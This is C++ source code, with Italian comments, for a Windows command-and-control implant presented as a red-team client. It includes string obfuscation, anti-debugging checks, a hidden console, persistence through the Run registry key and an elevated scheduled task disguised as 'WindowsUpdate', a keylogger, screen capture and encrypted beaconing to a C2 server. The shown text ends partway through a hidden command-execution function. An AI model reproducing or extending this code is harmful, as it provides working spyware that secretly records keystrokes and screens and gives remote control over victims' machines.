// lab_client_redt_advanced.cpp - Advanced Red Team C2 Client
// © 2024 Sebastian Martin. All rights reserved.
// This software is proprietary and confidential. Unauthorized use is prohibited.
#define WIN32_LEAN_AND_MEAN
#define SECURITY_WIN32
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>            // Deve essere PRIMA
#include <winsock2.h>            // Poi questo
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif
#include <shellapi.h>           // Necessario per ShellExecuteExA
#include <ws2tcpip.h>
#include <winhttp.h>

// Includi la chiave pubblica del server hardcoded
#include "server_public_key.h"

#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#include <shlwapi.h>
#include <bcrypt.h>
#include <gdiplus.h>
#include <shlobj.h>
#include <stdio.h>
#include <time.h>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <intrin.h>
#include <stdarg.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "dpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "urlmon.lib")

// --- CONFIG ---
#define C2_HOST "127.0.0.1"         // Cambia con il tuo server locale
#define C2_PATH "/api/report"
#define C2_PORT 8443                // Usa 8443 se 443 è bloccato
#define BEACON_JITTER_MS 5000
#define KEYLOG_FLUSH_SEC 60
#define SCREENSHOT_INTERVAL_SEC 120
#define MAX_LOG_SIZE 8192
#define MAX_CMD_SIZE 4096

// RSA-OAEP Configuration
#define RSA_KEY_SIZE 2048
#define RSA_ALGORITHM BCRYPT_RSA_ALGORITHM
#define RSA_OAEP_PADDING BCRYPT_PAD_OAEP
#define SHA256_ALGORITHM BCRYPT_SHA256_ALGORITHM

// --- DEBUG LOGGING (solo per testing) ---
#ifdef _DEBUG
void debug_log(const char* format, ...) {
    // Log su file per debug (rimuovere in produzione)
    std::ofstream logfile("c2client_debug.log", std::ios::app);
    if (logfile) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timestamp[64];
        sprintf_s(timestamp, "[%02d:%02d:%02d.%03d]", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
        
        char message[1024];
        va_list args;
        va_start(args, format);
        vsprintf_s(message, format, args);
        va_end(args);
        
        logfile << timestamp << " " << message << std::endl;
    }
}
#else
void debug_log(const char* format, ...) {
    // Output forzato per il test anche in release
    char message[1024];
    va_list args;
    va_start(args, format);
    vsprintf_s(message, format, args);
    va_end(args);
    
    std::cout << "[DEBUG] " << message << std::endl;
}
#endif

// --- OBFUSCAZIONE STRINGHE (C++17 compatibile) ---
constexpr char xor_crypt_char(char c, char k = 0x55) {
    return c ^ k;
}

template<size_t N>
struct obfuscated_string {
    char data[N];

    // Costruttore constexpr (obfusca a compile-time)
    constexpr obfuscated_string(const char* str) : data{} {
        for (size_t i = 0; i < N; ++i) {
            data[i] = xor_crypt_char(str[i]);
        }
    }

    // Decifra a runtime (thread-safe: usa buffer statico)
    const char* decrypt() const {
        static char buffer[N];
        for (size_t i = 0; i < N; ++i) {
            buffer[i] = data[i] ^ 0x55;
        }
        return buffer;
    }
};

// Macro per obfuscare stringhe
#define OBF(s) []() -> const char* { \
    constexpr obfuscated_string<sizeof(s)> obs(s); \
    return obs.decrypt(); \
}()

// --- Utility Functions ---
std::wstring UTF8ToWide(const std::string& utf8) {
    if (utf8.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &utf8[0], (int)utf8.size(), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &utf8[0], (int)utf8.size(), &wstr[0], size_needed);
    return wstr;
}

std::string WideToUTF8(const std::wstring& wide) {
    if (wide.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wide[0], (int)wide.size(), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wide[0], (int)wide.size(), &str[0], size_needed, NULL, NULL);
    return str;
}

// --- ANTI-ANALISI AVANZATA ---
bool is_debugger() {
    BOOL isRemoteDebuggerPresent = FALSE;
    return IsDebuggerPresent() || 
           (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent) && isRemoteDebuggerPresent);
}

// --- CONTROLLO VERSIONE WINDOWS ---
bool is_windows_version_supported() {
    OSVERSIONINFOEX osvi = { sizeof(OSVERSIONINFOEX) };
    DWORDLONG condition_mask = 0;
    
    // Windows 7 o superiore
    osvi.dwMajorVersion = 6;
    osvi.dwMinorVersion = 1;
    osvi.wServicePackMajor = 0;
    osvi.wServicePackMinor = 0;
    
    VER_SET_CONDITION(condition_mask, VER_MAJORVERSION, VER_GREATER_EQUAL);
    VER_SET_CONDITION(condition_mask, VER_MINORVERSION, VER_GREATER_EQUAL);
    VER_SET_CONDITION(condition_mask, VER_SERVICEPACKMAJOR, VER_GREATER_EQUAL);
    VER_SET_CONDITION(condition_mask, VER_SERVICEPACKMINOR, VER_GREATER_EQUAL);
    
    return VerifyVersionInfo(&osvi, VER_MAJORVERSION | VER_MINORVERSION | 
                           VER_SERVICEPACKMAJOR | VER_SERVICEPACKMINOR, condition_mask) != FALSE;
}

bool is_vm() {
    // For testing purposes only - disable VM detection
    return false;
    
    /*
    // CPUID check for hypervisor
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if ((cpuInfo[2] & (1 << 31)) != 0) return true;

    // Process check
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, OBF("vmtoolsd.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("VBoxTray.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("qemu-ga.exe")) == 0 ||
                _stricmp(pe.szExeFile, OBF("vboxservice.exe")) == 0) {
                CloseHandle(hSnap);
                return true;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return false;
    */
}

// --- STEALTH ---
void stealth() {
    HWND h = FindWindowA(OBF("ConsoleWindowClass"), nullptr);
    if (h) ShowWindow(h, SW_HIDE);
    if (GetConsoleWindow()) FreeConsole();
    DisableThreadLibraryCalls(GetModuleHandle(nullptr));
}

// --- PERSISTENZA AVANZATA (HKCU + Task Scheduler) ---
bool persist() {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(nullptr, path, MAX_PATH)) {
        return false;
    }

    // 1. Registry
    HKEY hKey;
    if (RegCreateKeyA(HKEY_CURRENT_USER, OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, OBF("UpdateCore"), 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(hKey);
    }

    // 2. Scheduled Task
    std::string cmd = std::string(OBF("/create /f /sc ONLOGON /rl HIGHEST /tn \"WindowsUpdate\" /tr \"")) + path + "\"";
    
    SHELLEXECUTEINFOA shExInfo = { sizeof(shExInfo) };
    shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shExInfo.lpVerb = OBF("runas");
    shExInfo.lpFile = OBF("schtasks.exe");
    shExInfo.lpParameters = cmd.c_str();
    shExInfo.nShow = SW_HIDE;
    
    if (ShellExecuteExA(&shExInfo) && shExInfo.hProcess) {
        WaitForSingleObject(shExInfo.hProcess, 5000);
        CloseHandle(shExInfo.hProcess);
    }

    return true;
}

// --- CRYPT: AES-256-GCM IN MEMORIA ---
std::string generate_random_bytes(size_t length) {
    std::string result;
    result.resize(length);
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RNG_ALGORITHM, NULL, 0);
    if (BCRYPT_SUCCESS(status)) {
        status = BCryptGenRandom(hAlgorithm, (PUCHAR)&result[0], (ULONG)length, 0);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (!BCRYPT_SUCCESS(status)) {
        // Fallback a std::random se BCrypt fallisce
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        for (size_t i = 0; i < length; i++) {
            result[i] = static_cast<char>(dis(gen));
        }
    }
    return result;
}

// Genera un IV unico per ogni richiesta
std::string generate_unique_iv() {
    return generate_random_bytes(12); // 96-bit IV per AES-GCM
}

// Funzioni per RSA-OAEP
bool rsa_generate_key_pair(BCRYPT_KEY_HANDLE* phKey, std::vector<BYTE>& publicKeyBlob) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlgorithm, RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptOpenAlgorithmProvider failed: 0x%08X", status);
        return false;
    }

    // Imposta la lunghezza della chiave
    DWORD rsa_key_size = RSA_KEY_SIZE;
    status = BCryptSetProperty(hAlgorithm, BCRYPT_KEY_LENGTH, (PUCHAR)&rsa_key_size, sizeof(DWORD), 0);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptSetProperty failed: 0x%08X", status);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    // Genera la coppia di chiavi
    status = BCryptGenerateKeyPair(hAlgorithm, phKey, RSA_KEY_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptGenerateKeyPair failed: 0x%08X", status);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    // Finalizza la chiave
    status = BCryptFinalizeKeyPair(*phKey, 0);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptFinalizeKeyPair failed: 0x%08X", status);
        BCryptDestroyKey(*phKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    // Esporta la chiave pubblica
    ULONG publicKeyBlobSize = 0;
    status = BCryptExportKey(*phKey, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, 0, &publicKeyBlobSize, 0);
    if (!BCRYPT_SUCCESS(status) && status != STATUS_BUFFER_TOO_SMALL) {
        debug_log("BCryptExportKey (size) failed: 0x%08X", status);
        BCryptDestroyKey(*phKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    publicKeyBlob.resize(publicKeyBlobSize);
    status = BCryptExportKey(*phKey, NULL, BCRYPT_RSAPUBLIC_BLOB, publicKeyBlob.data(), publicKeyBlobSize, &publicKeyBlobSize, 0);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptExportKey failed: 0x%08X", status);
        BCryptDestroyKey(*phKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    return true;
}

bool rsa_encrypt_oaep(const std::vector<BYTE>& publicKeyBlob, const std::string& plaintext, std::vector<BYTE>& ciphertext) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlgorithm, RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptOpenAlgorithmProvider failed: 0x%08X", status);
        return false;
    }

    // Importa la chiave pubblica
    BCRYPT_KEY_HANDLE hPublicKey = NULL;
    status = BCryptImportKeyPair(hAlgorithm, NULL, BCRYPT_RSAPUBLIC_BLOB, &hPublicKey, (PUCHAR)publicKeyBlob.data(), (ULONG)publicKeyBlob.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptImportKeyPair failed: 0x%08X", status);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    // Calcola la dimensione del ciphertext
    ULONG ciphertextSize = 0;
    status = BCryptEncrypt(hPublicKey, (PUCHAR)plaintext.data(), (ULONG)plaintext.size(), NULL, NULL, 0, NULL, 0, &ciphertextSize, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status) && status != STATUS_BUFFER_TOO_SMALL) {
        debug_log("BCryptEncrypt (size) failed: 0x%08X", status);
        BCryptDestroyKey(hPublicKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    ciphertext.resize(ciphertextSize);
    
    // Esegui la cifratura con OAEP padding
    status = BCryptEncrypt(hPublicKey, (PUCHAR)plaintext.data(), (ULONG)plaintext.size(), NULL, NULL, 0, ciphertext.data(), ciphertextSize, &ciphertextSize, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptEncrypt failed: 0x%08X", status);
        BCryptDestroyKey(hPublicKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    BCryptDestroyKey(hPublicKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    return true;
}

bool rsa_decrypt_oaep(BCRYPT_KEY_HANDLE hPrivateKey, const std::vector<BYTE>& ciphertext, std::string& plaintext) {
    ULONG plaintextSize = 0;
    NTSTATUS status = BCryptDecrypt(hPrivateKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), NULL, NULL, 0, NULL, 0, &plaintextSize, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status) && status != STATUS_BUFFER_TOO_SMALL) {
        debug_log("BCryptDecrypt (size) failed: 0x%08X", status);
        return false;
    }

    plaintext.resize(plaintextSize);
    status = BCryptDecrypt(hPrivateKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), NULL, NULL, 0, (PUCHAR)plaintext.data(), plaintextSize, &plaintextSize, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status)) {
        debug_log("BCryptDecrypt failed: 0x%08X", status);
        return false;
    }

    plaintext.resize(plaintextSize);
    return true;
}

std::vector<uint8_t> aes_encrypt_gcm(const uint8_t* plaintext, size_t plaintext_len,
                                   const uint8_t* key, uint8_t* iv_out, uint8_t* tag) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Genera un IV unico per questa richiesta
    std::string iv = generate_unique_iv();
    memcpy(iv_out, iv.data(), 12); // Restituisce l'IV generato

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);
    if (!BCRYPT_SUCCESS(status)) return {};

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv.c_str();
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;

    std::vector<uint8_t> ciphertext(plaintext_len);
    ULONG encrypted_len = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)plaintext, (ULONG)plaintext_len,
                          &authInfo, nullptr, 0,
                          ciphertext.data(), (ULONG)ciphertext.size(),
                          &encrypted_len, 0);

    if (!BCRYPT_SUCCESS(status)) {
        ciphertext.clear();
    }

    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    
    return ciphertext;
}

std::vector<uint8_t> aes_decrypt_gcm(const uint8_t* key, const uint8_t* iv, 
                                    const uint8_t* ciphertext, size_t ciphertext_len,
                                    const uint8_t* tag) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);
    if (!BCRYPT_SUCCESS(status)) return {};

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv;
    authInfo.cbNonce = 12;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = 16;

    std::vector<uint8_t> plaintext(ciphertext_len);
    ULONG decrypted_len = 0;
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, (ULONG)ciphertext_len,
                           &authInfo, nullptr, 0,
                           plaintext.data(), (ULONG)plaintext.size(),
                           &decrypted_len, 0);

    if (!BCRYPT_SUCCESS(status)) {
        plaintext.clear();
    }

    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    
    return plaintext;
}

// --- HTTPS CLIENT MINIMALE (con WinHTTP) ---
// Callback per la verifica del certificato del server
static void __stdcall server_cert_check_callback(
    HINTERNET hInternet,
    DWORD_PTR dwContext,
    DWORD dwInternetStatus,
    LPVOID lpvStatusInformation,
    DWORD dwStatusInformationLength) {
    
    if (dwInternetStatus == WINHTTP_CALLBACK_STATUS_SECURE_FAILURE) {
        debug_log("Secure connection failure detected");
    }
    
    if (dwInternetStatus == WINHTTP_CALLBACK_STATUS_REQUEST_ERROR) {
        WINHTTP_ASYNC_RESULT* pResult = (WINHTTP_ASYNC_RESULT*)lpvStatusInformation;
        debug_log("Request error: %d", pResult->dwError);
    }
}

// Verifica il certificato del server
bool verify_server_certificate(HINTERNET hRequest) {
    DWORD certFlags = 0;
    DWORD certFlagsSize = sizeof(certFlags);
    
    if (!WinHttpQueryOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &certFlags, &certFlagsSize)) {
        debug_log("WinHttpQueryOption failed: %d", GetLastError());
        return false;
    }
    
    // Verifica che il certificato sia valido e trusted
    if (certFlags & (SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE)) {
        debug_log("Certificate validation issues detected: 0x%08X", certFlags);
        return false;
    }
    
    return true;
}

std::string https_post(const std::string& host, const std::string& path, const std::vector<uint8_t>& data) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    std::string response;

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                          WINHTTP_NO_PROXY_NAME, 
                          WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);
    if (!hSession) {
        debug_log("WinHttpOpen failed: %d", GetLastError());
        return response;
    }

    // Imposta la callback per la verifica della sicurezza
    WinHttpSetStatusCallback(hSession, server_cert_check_callback, 
                           WINHTTP_CALLBACK_STATUS_SECURE_FAILURE | 
                           WINHTTP_CALLBACK_STATUS_REQUEST_ERROR, 0);

    hConnect = WinHttpConnect(hSession, UTF8ToWide(host).c_str(), C2_PORT, 0);
    if (!hConnect) {
        debug_log("WinHttpConnect failed: %d", GetLastError());
        WinHttpCloseHandle(hSession);
        return response;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"POST", UTF8ToWide(path).c_str(),
                                 NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                 WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        debug_log("WinHttpOpenRequest failed: %d", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return response;
    }

    // Richiedi la verifica completa del certificato
    DWORD dwFlags = 0; // Nessun flag di ignorare errori
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
        debug_log("WinHttpSetOption failed: %d", GetLastError());
    }
    
    // Imposta la verifica del nome host nel certificato
    DWORD secureProtocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURE_PROTOCOLS, &secureProtocols, sizeof(secureProtocols))) {
        debug_log("WinHttpSetOption secure protocols failed: %d", GetLastError());
    }

    // Set headers
    LPCWSTR headers = L"Content-Type: application/octet-stream\r\n";
    WinHttpAddRequestHeaders(hRequest, headers, -1, WINHTTP_ADDREQ_FLAG_ADD);

    if (!WinHttpSendRequest(hRequest, 
                          WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          (LPVOID)data.data(), (DWORD)data.size(), (DWORD)data.size(), 0)) {
        debug_log("WinHttpSendRequest failed: %d", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return response;
    }

    // Verifica il certificato del server dopo l'invio della richiesta
    if (!verify_server_certificate(hRequest)) {
        debug_log("Server certificate verification failed");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return response;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        debug_log("WinHttpReceiveResponse failed: %d", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return response;
    }

    DWORD dwSize = 0;
    do {
        DWORD dwDownloaded = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            debug_log("WinHttpQueryDataAvailable failed: %d", GetLastError());
            break;
        }
        if (dwSize == 0) {
            break;
        }

        std::vector<char> buffer(dwSize + 1);
        if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
            debug_log("WinHttpReadData failed: %d", GetLastError());
            break;
        }
        response.append(buffer.data(), dwDownloaded);
    } while (dwSize > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return response;
}

// --- KEYLOGGER IN MEMORIA ---
std::string LOG_BUF;
void log_keys() {
    static bool keys[256] = {};
    for (int k = 8; k <= 255; k++) {
        if (GetAsyncKeyState(k) & 0x8000) {
            if (!keys[k]) {
                switch (k) {
                    case VK_RETURN: LOG_BUF += "\n"; break;
                    case VK_SPACE:  LOG_BUF += " "; break;
                    case VK_BACK:   LOG_BUF += "[BS]"; break;
                    case VK_TAB:    LOG_BUF += "[TAB]"; break;
                    case VK_ESCAPE: LOG_BUF += "[ESC]"; break;
                    default: {
                        char name[64] = {};
                        if (GetKeyNameTextA(MapVirtualKey(k, MAPVK_VK_TO_VSC) << 16, name, 64))
                            LOG_BUF += name;
                        break;
                    }
                }
                if (LOG_BUF.size() > MAX_LOG_SIZE) {
                    LOG_BUF.erase(0, MAX_LOG_SIZE / 2);
                }
            }
            keys[k] = true;
        } else {
            keys[k] = false;
        }
    }
}

// --- SCREENSHOT ---
std::vector<uint8_t> take_screenshot() {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken = 0;
    HDC hdcScreen = nullptr;
    HDC hdcMem = nullptr;
    HBITMAP hBitmap = nullptr;
    IStream* pStream = nullptr;
    
    // Initialize GDI+
    Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    if (status != Gdiplus::Ok) {
        debug_log("GDI+ startup failed");
        return {};
    }

    // Get screen DC
    hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        debug_log("GetDC failed");
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }

    // Create memory DC
    hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        debug_log("CreateCompatibleDC failed");
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    // Create bitmap
    hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hBitmap) {
        debug_log("CreateCompatibleBitmap failed");
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }

    // Capture screen
    HGDIOBJ old_obj = SelectObject(hdcMem, hBitmap);
    if (!old_obj) {
        debug_log("SelectObject failed");
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }
    
    if (!BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY)) {
        debug_log("BitBlt failed");
        SelectObject(hdcMem, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }
    
    SelectObject(hdcMem, old_obj);
    
    // Create bitmap from HBITMAP
    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    
    // Create stream
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
        debug_log("CreateStreamOnHGlobal failed");
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }
    
    // Get PNG CLSID
    CLSID clsid;
    if (CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsid) != NOERROR) {
        debug_log("CLSIDFromString failed");
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }
    
    // Save to stream
    if (bitmap.Save(pStream, &clsid, NULL) != Gdiplus::Ok) {
        debug_log("Bitmap.Save failed");
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }
    
    // Get stream size
    STATSTG statstg;
    if (pStream->Stat(&statstg, STATFLAG_NONAME) != S_OK) {
        debug_log("Stream.Stat failed");
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }
    
    ULONG size = statstg.cbSize.LowPart;
    std::vector<uint8_t> data(size);
    
    // Seek to beginning
    LARGE_INTEGER li = {0};
    if (pStream->Seek(li, STREAM_SEEK_SET, NULL) != S_OK) {
        debug_log("Stream.Seek failed");
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }
    
    // Read data
    ULONG bytesRead = 0;
    if (pStream->Read(data.data(), size, &bytesRead) != S_OK || bytesRead != size) {
        debug_log("Stream.Read failed");
        pStream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return {};
    }
    
    // Cleanup
    pStream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    debug_log("Screenshot captured successfully: %zu bytes", data.size());
    return data;
}

// --- EXECUTE COMMAND ---
std::string execute_command(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "";
    }

    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;

